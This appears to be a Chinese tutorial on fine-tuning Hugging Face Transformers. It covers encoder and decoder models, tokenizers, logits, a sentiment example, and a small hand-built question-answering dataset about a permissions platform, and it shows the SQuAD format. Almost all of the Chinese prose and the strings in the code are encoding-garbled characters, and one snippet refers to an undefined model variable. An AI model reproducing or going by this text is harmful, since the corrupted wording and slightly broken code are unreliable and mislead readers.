<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>ã€‚</p>
</blockquote>
<p>åœ¨è‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰çš„æµªæ½®ä¸­ï¼Œå¤§å‹é¢„è®­ç»ƒæ¨¡å‹ï¼ˆå¦‚ BERTã€GPT ç­‰ï¼‰å·²æˆä¸ºé©±åŠ¨å„ç±»åº”ç”¨çš„æ ¸å¿ƒå¼•æ“ã€‚ç„¶è€Œï¼Œå¦‚ä½•è®©è¿™äº›é€šç”¨æ¨¡å‹æ›´å¥½åœ°é€‚åº”æˆ‘ä»¬ç‰¹å®šçš„ä¸šåŠ¡åœºæ™¯ï¼Ÿç­”æ¡ˆä¾¿æ˜¯å¾®è°ƒï¼ˆFine-tuningï¼‰ã€‚Hugging Face æ¨å‡ºçš„ Transformers åº“ï¼Œå‡­å€Ÿå…¶æ— ä¸ä¼¦æ¯”çš„æ˜“ç”¨æ€§å’Œä¸°å¯Œçš„æ¨¡å‹ç”Ÿæ€ï¼Œæå¤§åœ°é™ä½äº†å¾®è°ƒçš„æŠ€æœ¯é—¨æ§›ã€‚</p>
<p>æœ¬æ–‡ä¸æ»¡è¶³äºå¯¹ API çš„æµ…å°è¾„æ­¢ï¼Œè€Œæ˜¯å¸Œæœ›ä¸ºæ‚¨æä¾›ä¸€ä»½å…¼å…·æ·±åº¦ä¸å¯æ“ä½œæ€§çš„â€œé£Ÿè°±â€ã€‚è¯»å®Œæœ¬æ–‡ï¼Œæ‚¨å°†ä¸ä»…èƒ½æˆåŠŸè¿è¡Œä»£ç ï¼Œæ›´èƒ½æ´æ‚‰å…¶èƒŒåçš„â€œä¸ºä»€ä¹ˆâ€ï¼Œå¹¶å…·å¤‡ç‹¬ç«‹è§£å†³å®é™…é—®é¢˜çš„èƒ½åŠ›ã€‚</p>
<blockquote>
<p>å¾ˆå¤šåŒå­¦å¯èƒ½å¯¹æ¨¡å‹çš„è®¤çŸ¥åœç•™åœ¨åº”ç”¨å±‚ï¼Œæœ¬æ–‡æ„åœ¨è®©å¤§å®¶èƒ½å¤Ÿæœ‰ä¸€äº›é’ˆå¯¹æ¨¡å‹çš„è®¤çŸ¥ï¼Œä»¥åŠè®­ç»ƒä¸€ä¸ªæ¨¡å‹ç©¶ç«Ÿéœ€è¦åˆ†ä¸ºå¤šå°‘æ­¥éª¤ï¼Ÿ</p>
</blockquote>
<h3 data-id="heading-0">åŸºç¡€æ¦‚å¿µ</h3>
<p>åœ¨åŠ¨æ‰‹ç¼–ç ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å…ˆèŠ±äº›æ—¶é—´ç†è§£ Transformers çš„æ ¸å¿ƒè®¾è®¡å“²å­¦ã€‚è¿™èƒ½å¸®åŠ©æˆ‘ä»¬åœ¨é‡åˆ°é—®é¢˜æ—¶ï¼Œä¸ä»…çŸ¥å…¶ç„¶ï¼Œæ›´èƒ½çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚</p>
<h4 data-id="heading-1">Transformers æ¨¡å‹</h4>
<p>Transformers æ¨¡å‹é€šå¸¸è§„æ¨¡åºå¤§ã€‚åŒ…å«æ•°ä»¥ç™¾ä¸‡è®¡åˆ°æ•°åƒä¸‡è®¡æ•°åäº¿çš„å‚æ•°ï¼Œè®­ç»ƒå’Œéƒ¨ç½²è¿™äº›æ¨¡å‹æ˜¯ä¸€é¡¹å¤æ‚çš„ä»»åŠ¡ã€‚å†è€…ï¼Œæ–°æ¨¡å‹çš„æ¨å‡ºå‡ ä¹æ—¥æ–°æœˆå¼‚ï¼Œè€Œæ¯ç§æ¨¡å‹éƒ½æœ‰å…¶ç‹¬ç‰¹çš„å®ç°æ–¹å¼ï¼Œå°è¯•å…¨éƒ¨æ¨¡å‹ç»éæ˜“äº‹ã€‚</p>
<p>Transformers åº“åº”è¿è€Œç”Ÿï¼Œå°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å®ƒçš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªç»Ÿä¸€çš„ API æ¥å£ï¼Œé€šè¿‡å®ƒå¯ä»¥åŠ è½½ã€è®­ç»ƒå’Œä¿å­˜ä»»ä½• Transformer æ¨¡å‹ã€‚</p>
<p><strong>Transformers æ¨¡å‹ç”¨äºè§£å†³å„ç§ NLP é—®é¢˜ï¼Œå¦‚</strong></p>
<ul>
<li><code>feature-extraction</code>ï¼ˆè·å–æ–‡æœ¬çš„å‘é‡è¡¨ç¤ºï¼‰</li>
<li><code>fill-mask</code>ï¼ˆå®Œå½¢å¡«ç©ºï¼‰</li>
<li><code>ner</code>ï¼ˆå‘½åå®ä½“è¯†åˆ«ï¼‰</li>
<li><code>question-answering</code>ï¼ˆé—®ç­”ï¼‰</li>
<li><code>sentiment-analysis</code>ï¼ˆæƒ…æ„Ÿåˆ†æï¼‰</li>
<li><code>summarization</code>ï¼ˆæå–æ‘˜è¦ï¼‰</li>
<li><code>text-generation</code>ï¼ˆæ–‡æœ¬ç”Ÿæˆï¼‰</li>
<li><code>translation</code>ï¼ˆç¿»è¯‘ï¼‰</li>
<li><code>zero-shot-classification</code>ï¼ˆé›¶æ ·æœ¬åˆ†ç±»ï¼‰</li>
</ul>
<p>Transformers æ¨¡å‹ä¸»è¦åˆ†ä¸º 2 å±‚ ï¼š<strong>ç¼–ç å™¨</strong>å’ŒÂ <strong>è§£ç å™¨</strong>ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç®€å•ç†è§£ä¸ºÂ <code>è¾“å…¥ -&gt; è¾“å‡º</code></p>
<h5 data-id="heading-2">ç¼–ç å™¨å’Œè§£ç å™¨</h5>
<ul>
<li><strong>ç¼–ç å™¨ (Encoder)</strong> : ä¸“èŒâ€œç†è§£â€ã€‚å®ƒè´Ÿè´£å°†è¾“å…¥æ–‡æœ¬ï¼ˆå¦‚ä¸€ä¸ªå¥å­ï¼‰è½¬æ¢æˆå¯Œå«è¯­ä¹‰ä¿¡æ¯çš„æ•°å­—è¡¨ç¤ºã€‚éå¸¸é€‚åˆåšæ–‡æœ¬åˆ†ç±»ã€å‘½åå®ä½“è¯†åˆ«ç­‰ä»»åŠ¡ã€‚ä»£è¡¨é€‰æ‰‹ï¼šBERTã€RoBERTaã€‚</li>
<li><strong>è§£ç å™¨ (Decoder)</strong> : ä¸“èŒâ€œç”Ÿæˆâ€ã€‚å®ƒèƒ½æ ¹æ®ä¸€ä¸ªåˆå§‹æŒ‡ä»¤ï¼ˆPromptï¼‰ï¼Œé€å­—é€å¥åœ°åˆ›é€ å‡ºæ–°çš„æ–‡æœ¬ã€‚æˆ‘ä»¬ç†ŸçŸ¥çš„ GPT ç³»åˆ—å°±æ˜¯å…¸å‹çš„è§£ç å™¨æ¶æ„ã€‚</li>
<li><strong>ç¼–ç å™¨-è§£ç å™¨ (Encoder-Decoder)</strong> : â€œç†è§£â€ä¸â€œç”Ÿæˆâ€çš„ç»“åˆä½“ã€‚å…ˆç”¨ç¼–ç å™¨æ¶ˆåŒ–è¾“å…¥æ–‡æœ¬ï¼Œå†ç”¨è§£ç å™¨äº§å‡ºç›®æ ‡æ–‡æœ¬ã€‚æ˜¯ç¿»è¯‘ã€æ‘˜è¦ç­‰ä»»åŠ¡çš„æ ‡é…ã€‚ä»£è¡¨é€‰æ‰‹ï¼šBARTã€T5ã€‚</li>
</ul>

























<table><thead><tr><th>æ¨¡å‹</th><th>ç¤ºä¾‹</th><th>ä»»åŠ¡</th></tr></thead><tbody><tr><td>ç¼–ç å™¨</td><td>BERT, DistilBERT, ELECTRA, RoBERTa</td><td>å¥å­åˆ†ç±»ã€å‘½åå®ä½“è¯†åˆ«ã€æŠ½å–å¼é—®ç­” (ä»æ–‡æœ¬ä¸­æå–ç­”æ¡ˆ)</td></tr><tr><td>è§£ç å™¨</td><td>CTRL, GPT, GPT-2, Transformer XL</td><td>æ–‡æœ¬ç”Ÿæˆ</td></tr><tr><td>ç¼–ç å™¨-è§£ç å™¨</td><td>BART, T5, Marian, mBART</td><td>æ–‡æœ¬æ‘˜è¦ã€ç¿»è¯‘ã€ç”Ÿæˆå¼é—®ç­” (ç”Ÿæˆé—®é¢˜çš„å›ç­”ç±»ä¼¼ chatgpt)</td></tr></tbody></table>
<h5 data-id="heading-3">æ¶æ„å’Œæ£€æŸ¥ç‚¹(Checkpoints)</h5>
<ul>
<li>æ¶æ„ï¼šè¿™æ˜¯æ¨¡å‹çš„éª¨æ¶ â€”â€” å³æ¯ä¸ªå±‚çš„å®šä¹‰ä»¥åŠæ¨¡å‹ä¸­å‘ç”Ÿçš„æ¯ä¸ªæ“ä½œã€‚</li>
<li>Checkpointsï¼ˆæ£€æŸ¥ç‚¹ï¼‰ï¼šè¿™äº›æ˜¯å°†åœ¨ç»™æ¶æ„ä¸­ç»“æ„ä¸­åŠ è½½çš„æƒé‡å‚æ•°ï¼Œæ˜¯ä¸€äº›å…·ä½“çš„æ•°å€¼ã€‚</li>
</ul>
<p>ä¸¾ä¸ªä¾‹å­ï¼šBERT æ˜¯ä¸€ä¸ªæ¶æ„ï¼Œè€Œ bert-base-cased ï¼Œè¿™æ˜¯è°·æ­Œå›¢é˜Ÿä¸º BERT çš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬è®­ç»ƒçš„ä¸€ç»„æƒé‡å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªå‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥è¯´â€œBERT æ¨¡å‹â€å’Œâ€œ bert-base-cased æ¨¡å‹ã€‚â€</p>
<h4 data-id="heading-4">Tokenizer</h4>
<p>ä¸å…¶ä»–ç¥ç»ç½‘ç»œä¸€æ ·ï¼ŒTransformers æ¨¡å‹æ— æ³•ç›´æ¥å¤„ç†åŸå§‹æ–‡æœ¬ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¼•å…¥Â <code>Tokenizer</code>ã€‚</p>
<p><strong><code>Tokenizer</code></strong> æ˜¯äººç±»è¯­è¨€ä¸æœºå™¨è¯­è¨€ä¹‹é—´çš„â€œç¿»è¯‘å®˜â€ã€‚å…¶èŒè´£é‡å¤§ï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>åˆ†è¯ (Tokenization)</strong> : å°† "ä»Šå¤©å¤©æ°”çœŸå¥½" è¿™æ ·çš„å¥å­æ‹†åˆ†æˆæ¨¡å‹èƒ½è®¤è¯†çš„æœ€å°å•å…ƒï¼Œå¦‚Â <code>["ä»Š", "å¤©", "å¤©", "æ°”", "çœŸ", "å¥½"]</code>ã€‚</li>
<li><strong>ID è½¬æ¢</strong>: å°†æ¯ä¸ªè¯å…ƒï¼ˆTokenï¼‰æ˜ å°„æˆä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„æ•°å­— IDï¼Œå³Â <code>input_ids</code>ã€‚</li>
<li><strong>æ·»åŠ ç‰¹æ®Šæ ‡è®°</strong>: æ’å…¥æ¨¡å‹å¿…éœ€çš„ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚Â <code>[CLS]</code>ç”¨äºåˆ†ç±»ä»»åŠ¡ï¼Œ<code>[SEP]</code>ç”¨äºåˆ†éš”å¥å­ã€‚</li>
<li><strong>ç”Ÿæˆæ³¨æ„åŠ›æ©ç  (Attention Mask)</strong> : å½“å¥å­é•¿åº¦ä¸ä¸€æ—¶ï¼ŒçŸ­å¥å­éœ€è¦è¢«â€œå¡«å……â€ï¼ˆPaddingï¼‰åˆ°ä¸é•¿å¥åŒæ ·çš„é•¿åº¦ã€‚æ³¨æ„åŠ›æ©ç å°±æ˜¯ä¸€ä¸ªç”± 0 å’Œ 1 ç»„æˆçš„åˆ—è¡¨ï¼Œå‘Šè¯‰æ¨¡å‹å“ªäº›æ˜¯çœŸå®è¯å…ƒï¼ˆå€¼ä¸º 1ï¼‰ï¼Œå“ªäº›æ˜¯å¡«å……ç‰©ï¼ˆå€¼ä¸º 0ï¼‰ï¼Œè®¡ç®—æ—¶åº”å¿½ç•¥åè€…ã€‚</li>
</ol>
<p>æˆ‘ä»¬å…ˆé€šè¿‡åˆ†è¯å™¨ï¼ˆTokenizerï¼‰æŠŠæ–‡æœ¬è½¬æ¢ä¸ºæ¨¡å‹èƒ½å¤Ÿè¯»æ‡‚çš„æ•°å­—ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">defÂ run_tokenizer():  
Â  Â  <span class="hljs-attr">checkpoint</span> =Â <span class="hljs-string">"distilbert-base-uncased-finetuned-sst-2-english"</span>  
Â  Â  <span class="hljs-attr">tokenizer</span> = AutoTokenizer.from_pretrained(checkpoint)  
Â  Â  <span class="hljs-attr">result</span> = tokenizer(  
Â  Â  Â  Â  <span class="hljs-section">["I am very urgent!",Â "I want to complain!"]</span>,  
Â  Â  Â  Â  <span class="hljs-attr">padding</span>=<span class="hljs-literal">True</span>,  
Â  Â  Â  Â  <span class="hljs-attr">truncation</span>=<span class="hljs-literal">True</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_tensors</span>=<span class="hljs-string">"pt"</span>,  
Â  Â  )  
Â  Â Â <span class="hljs-comment"># {  </span>
Â  Â Â <span class="hljs-comment"># Â  Â  'input_ids':  </span>
Â  Â Â <span class="hljs-comment"># Â  Â  Â  Â  Â tensor([[ Â 101, Â 1045, Â 2572, Â 2200, 13661, 999, 102],[ 101, Â 1045, Â 2215, Â 2000, 17612, Â 999, Â 102]]),  </span>
Â  Â Â <span class="hljs-comment"># Â  Â  'attention_mask':  </span>
Â  Â Â <span class="hljs-comment"># Â  Â  Â  Â  Â tensor([[1, 1, 1, 1, 1, 1, 1], [1, 1, 1, 1, 1, 1, 1]])  </span>
Â  Â Â <span class="hljs-comment"># }  </span>
Â  Â Â <span class="hljs-comment"># è¾“å‡ºæ˜¯ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªé”®ï¼Œ input_ids å’Œ attention_mask  </span>
Â  Â Â <span class="hljs-comment"># input_ids åŒ…å«ä¸¤è¡Œæ•´æ•°ï¼ˆæ¯ä¸ªå¥å­ä¸€è¡Œï¼‰ï¼Œå®ƒä»¬æ˜¯æ¯ä¸ªå¥å­ä¸­ token çš„ IDã€‚  </span>
Â  Â  print(result)
</code></pre>
<h4 data-id="heading-5">Model</h4>
<p>æ¨¡å‹ä¼šæ¥æ”¶ Tokenizer ç”Ÿæˆçš„æ•°å­—ï¼Œé€šè¿‡æ¨¡å‹å¤´ç­‰è¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆç”Ÿæˆå¯¹åº”ä»»åŠ¡çš„è¾“å‡ºç»“æœã€‚ä¾‹å¦‚ï¼Œåœ¨æƒ…æ„Ÿåˆ†ç±»ä»»åŠ¡ä¸­ç”Ÿæˆç±»åˆ«æ¦‚ç‡åˆ†å¸ƒï¼Œåˆ†åˆ«æ˜¯æ­£é¢å’Œè´Ÿé¢ã€‚</p>
<p>ä½†è¿™äº›ä¸æ˜¯æ¦‚ç‡ï¼Œè€Œæ˜¯Â <strong>logitsï¼ˆå¯¹æ•°å‡ ç‡ï¼‰</strong> ï¼Œæ˜¯æ¨¡å‹æœ€åä¸€å±‚è¾“å‡ºçš„åŸå§‹çš„ã€æœªæ ‡å‡†åŒ–çš„åˆ†æ•°ã€‚è¦è½¬æ¢ä¸ºæ¦‚ç‡ï¼Œå®ƒä»¬éœ€è¦ç»è¿‡ SoftMax å±‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ª<strong>æƒ…æ„Ÿåˆ†ç±»</strong>çš„ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">defÂ run_model():  
Â  Â Â fromÂ transformersÂ importÂ AutoModel, AutoModelForSequenceClassification, AutoTokenizer  
Â  Â Â importÂ torch.nn.functionalÂ asÂ F  
Â  Â  <span class="hljs-attr">checkpoint</span> =Â <span class="hljs-string">"distilbert-base-uncased-finetuned-sst-2-english"</span>  
Â  Â  <span class="hljs-attr">model</span> = AutoModelForSequenceClassification.from_pretrained(checkpoint)  
Â  Â  <span class="hljs-attr">tokenizer</span> = AutoTokenizer.from_pretrained(checkpoint)  
Â  Â Â <span class="hljs-comment"># åˆ†è¯å¾—åˆ° input_ids  </span>
Â  Â  <span class="hljs-attr">input</span> = tokenizer([<span class="hljs-string">"I am very urgent!"</span>,Â <span class="hljs-string">"I want to complain!"</span>], padding=<span class="hljs-literal">True</span>, return_tensors=<span class="hljs-string">"pt"</span>)  
Â Â   
Â  Â  <span class="hljs-attr">res</span> = model(**input)  
Â  Â Â <span class="hljs-comment"># å¤„ç†ååºè¾“å‡º  </span>
Â  Â  <span class="hljs-attr">probabilities</span> = F.softmax(res.logits, dim=-<span class="hljs-number">1</span>)  
Â  Â Â <span class="hljs-comment"># è·å–æ¨¡å‹è¾“å‡ºå¯¹åº”çš„label  </span>
Â  Â  <span class="hljs-attr">labels</span> = sequence_classication_model.config.id2label
</code></pre>
<h3 data-id="heading-6">ä»å¾®è°ƒä¸€ä¸ªå°æ¨¡å‹å­¦èµ·</h3>
<p>å­¦ä¹ å¤§æ¨¡å‹æœ€å¥½çš„åŠæ³•å°±æ˜¯åŠ¨æ‰‹å®è·µã€‚ä¸‹é¢ä»å¾®è°ƒä¸€ä¸ªç®€å•çš„é—®ç­”æ¨¡å‹ä¸ºä¾‹å­ï¼Œæ‰“å¼€å­¦ä¹ å¤§æ¨¡å‹çš„å¤§é—¨å§ã€‚</p>
<blockquote>
<p><strong>æ™ºèƒ½æµç¨‹æ€»ç»“</strong></p>
<ol>
<li>
<p><strong>åŸæ–™ï¼ˆæ•°æ®ï¼‰å‡†å¤‡</strong>ï¼šæˆ‘ä»¬éœ€è¦ä¸€æ‰¹åŒ…å«Â <code>context</code>ï¼ˆä¸Šä¸‹æ–‡ï¼‰ã€<code>question</code>ï¼ˆé—®é¢˜ï¼‰å’ŒÂ <code>answers</code>ï¼ˆç­”æ¡ˆæ–‡æœ¬åŠå…¶åœ¨ä¸Šä¸‹æ–‡ä¸­çš„èµ·å§‹ä½ç½®ï¼‰çš„æ•°æ®é›†ã€‚</p>
</li>
<li>
<p><strong>é¢„å¤„ç†ï¼ˆåˆ†è¯ï¼‰</strong> ï¼šè°ƒç”¨ä¸é¢„è®­ç»ƒæ¨¡å‹é…å¥—çš„Â <code>Tokenizer</code>ï¼Œå°†Â <code>question</code>å’ŒÂ <code>context</code>è½¬åŒ–ä¸ºæ¨¡å‹å¯æ¶ˆåŒ–çš„Â <code>input_ids</code>ã€<code>attention_mask</code>ç­‰æ•°å€¼è¾“å…¥ã€‚å¯¹äº QA ä»»åŠ¡ï¼Œè¿™ä¸€æ­¥è‡³å…³é‡è¦ï¼Œå®ƒè¿˜éœ€è¦è®¡ç®—å‡ºç­”æ¡ˆåœ¨åˆ†è¯ååºåˆ—ä¸­æ‰€å¯¹åº”çš„Â <code>start_positions</code>å’ŒÂ <code>end_positions</code>ã€‚</p>
</li>
<li>
<p><strong>é€å…¥æ¨¡å‹</strong>ï¼šå°†å¤„ç†å¥½çš„æ•°æ®å–‚ç»™ä¸€ä¸ªä¸“ç”¨äºé—®ç­”ä»»åŠ¡çš„æ¨¡å‹ï¼Œå¦‚Â <code>AutoModelForQuestionAnswering</code>ã€‚</p>
</li>
<li>
<p><strong>è®­ç»ƒï¼ˆå¾®è°ƒï¼‰</strong> ï¼š</p>
</li>
</ol>
<ul>
<li>
<p>é…ç½®Â <code>TrainingArguments</code>ï¼Œç”¨äºè®¾å®šå­¦ä¹ ç‡ã€æ‰¹æ¬¡å¤§å°ï¼ˆBatch Sizeï¼‰ç­‰è¶…å‚æ•°ã€‚</p>
</li>
<li>
<p>å¯åŠ¨Â <code>Trainer</code>ï¼Œå®ƒä¼šè‡ªåŠ¨å¤„ç†è®¾å¤‡åˆ†é…ï¼ˆCPU/GPUï¼‰ã€æ¢¯åº¦æ›´æ–°ã€æ—¥å¿—è®°å½•ç­‰ä¸€ç³»åˆ—ç¹æ‚çš„åå°å·¥ä½œã€‚</p>
</li>
<li>
<p>è®­ç»ƒçš„æ ¸å¿ƒç›®æ ‡æ˜¯ï¼šé€šè¿‡ä¸æ–­è°ƒæ•´æ¨¡å‹æƒé‡ï¼Œä½¿å¾—æ¨¡å‹é¢„æµ‹çš„ç­”æ¡ˆèµ·æ­¢ä½ç½®ï¼Œä¸æˆ‘ä»¬æä¾›çš„çœŸå®æ ‡ç­¾è¶Šæ¥è¶Šæ¥è¿‘ã€‚</p>
</li>
</ul>
<ol start="0">
<li><strong>å‡ºå‚ï¼ˆåå¤„ç†ï¼‰</strong> ï¼šå°†æ–°çš„é—®é¢˜å’Œä¸Šä¸‹æ–‡è¾“å…¥ç»™å¾®è°ƒå®Œæ¯•çš„æ¨¡å‹ã€‚æ¨¡å‹ä¼šè¾“å‡ºä¸¤ç»„åˆ†æ•°ï¼ˆ<code>start_logits</code>å’ŒÂ <code>end_logits</code>ï¼‰ï¼Œåˆ†åˆ«ä»£è¡¨æ¯ä¸ªè¯å…ƒä½œä¸ºç­”æ¡ˆå¼€å¤´å’Œç»“å°¾çš„å¯èƒ½æ€§ã€‚æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„åå¤„ç†é€»è¾‘ï¼Œæ‰¾åˆ°åˆ†æ•°æœ€é«˜çš„ç»„åˆï¼Œä¾¿èƒ½è§£ç å‡ºæœ€ç»ˆçš„ç­”æ¡ˆæ–‡æœ¬ã€‚</li>
</ol>
</blockquote>
<h4 data-id="heading-7">è·å–æ•°æ®é›†</h4>
<p>è®­ç»ƒæ¨¡å‹æœ€é‡è¦çš„äº‹æƒ…æ˜¯<strong>æ•°æ®é›†ï¼</strong> æˆ‘ä»¬å¯ä»¥ä»Hugging Faceç­‰æ¸ é“è·å–å„ç§å„æ ·çš„æ•°æ®é›†ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ•ˆæœæ˜æ˜¾ï¼Œè‡ªå·±å»æ„å»ºä¸€ä¸ªæä¸ºç®€å•çš„æ•°æ®é›†ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ctx</span> =Â <span class="hljs-string">"""  
Â  Â  æƒé™ç®¡ç†å¹³å° ACC(Auth Config Center)  
Â  Â  ä¸ºä¸­å°æä¾›ä¸€å¥—è¿è¡Œç¨³å®šã€å®‰å…¨å¯é ã€ç•Œé¢ç®€æ´çš„å¯è§†åŒ–æƒé™é…ç½®èƒ½åŠ›ã€‚åŒ…æ‹¬ï¼šæƒé™é…ç½®ã€æƒé™ä¸‹å‘åŠé‰´æƒåŠŸèƒ½ã€‚  
Â  Â  å…¶æ¶‰åŠäº†ä¸€äº›åè¯ï¼š  
Â  Â  - æƒé™ç‚¹(keyword)ï¼šæƒé™ç³»ç»Ÿä¸­æœ€å°çš„æƒé™ç²’åº¦æ˜ å°„åˆ°ä¸šåŠ¡ç³»ç»Ÿå¯¹åº”ç³»ç»Ÿæ“ä½œåŠŸèƒ½ã€‚ä¾‹å¦‚ï¼šæŸ¥è¯¢ï¼Œæœç´¢ï¼Œåˆ é™¤ç­‰æ“ä½œ  
Â  Â  - åŠŸèƒ½æƒé™æ ‘ï¼šä¸ºç”¨æˆ·æä¾›æƒé™ä¸‹å‘ä¸ç³»ç»Ÿæƒé™ç®¡æ§  
Â  Â  - èœå•æƒé™æ ‘ï¼šæä¾›é¡µé¢åŠèœå•çš„æƒé™ä¸‹å‘ä¸ç®¡æ§  
Â  Â  - ç™½åå•ï¼šæ— éœ€ç™»å½•ã€éœ€è¦ç™»å½•æ— éœ€é‰´æƒèµ‹äºˆæŸä¸€ç‰¹å®šè§’è‰²åŠŸèƒ½  
Â  Â  """</span>  
Â <span class="hljs-comment"># åŸå§‹æ•°æ®åˆ—è¡¨  </span>
Â  Â  <span class="hljs-attr">raw_data</span> = [  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"001"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"ä»€ä¹ˆæ˜¯ ACC"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™ç®¡ç†å¹³å°"</span>,  
Â  Â  Â  Â  },  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"002"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"ACC æœ‰å“ªäº›åŠŸèƒ½"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™é…ç½®ã€æƒé™ä¸‹å‘åŠé‰´æƒåŠŸèƒ½"</span>,  
Â  Â  Â  Â  },  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"003"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"ACC æœ‰å“ªäº›åè¯"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™ç‚¹"</span>,  
Â  Â  Â  Â  },  
Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"id"</span>:Â <span class="hljs-string">"004"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"context"</span>: ctx,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"question"</span>:Â <span class="hljs-string">"æƒé™ç‚¹æ˜¯å¹²å˜›çš„"</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"answer_text"</span>:Â <span class="hljs-string">"æƒé™ç³»ç»Ÿä¸­æœ€å°çš„æƒé™ç²’åº¦æ˜ å°„åˆ°ä¸šåŠ¡ç³»ç»Ÿå¯¹åº”ç³»ç»Ÿæ“ä½œåŠŸèƒ½"</span>,  
Â  Â  Â  Â  },  
Â  Â  ]
</code></pre>
<p>æœ‰äº†åŸå§‹æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚åœ¨å­¦æœ¯é¢†åŸŸï¼Œç”¨äºæŠ½å–å¼é—®ç­”çš„æœ€å¸¸ç”¨åŸºå‡†æ•°æ®é›†æ˜¯SQuADï¼Œæˆ‘ä»¬å¯ä»¥å»ä¸‹è½½ä¸€ä¸‹ï¼Œçœ‹çœ‹å®ƒçš„æ ¼å¼æ˜¯æ€æ ·çš„</p>
<pre><code class="hljs language-shell" lang="shell">fromÂ datasetsÂ importÂ load_dataset  
  
raw_datasets = load_dataset("squad")  
<span class="hljs-meta prompt_">  
# </span><span class="bash">DatasetDict({</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  train: Dataset({</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  Â  Â  features: [<span class="hljs-string">'id'</span>, <span class="hljs-string">'title'</span>, <span class="hljs-string">'context'</span>, <span class="hljs-string">'question'</span>, <span class="hljs-string">'answers'</span>],</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  Â  Â  num_rows: 87599</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  })</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  validation: Dataset({</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  Â  Â  features: [<span class="hljs-string">'id'</span>, <span class="hljs-string">'title'</span>, <span class="hljs-string">'context'</span>, <span class="hljs-string">'question'</span>, <span class="hljs-string">'answers'</span>],</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  Â  Â  num_rows: 10570</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">Â  Â  })</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">})</span>  
<span class="hljs-meta prompt_">  
# </span><span class="bash">å…¶ä¸­answersæ ¼å¼ä¸º{text:string[], answer_start:int[]}</span>
</code></pre>
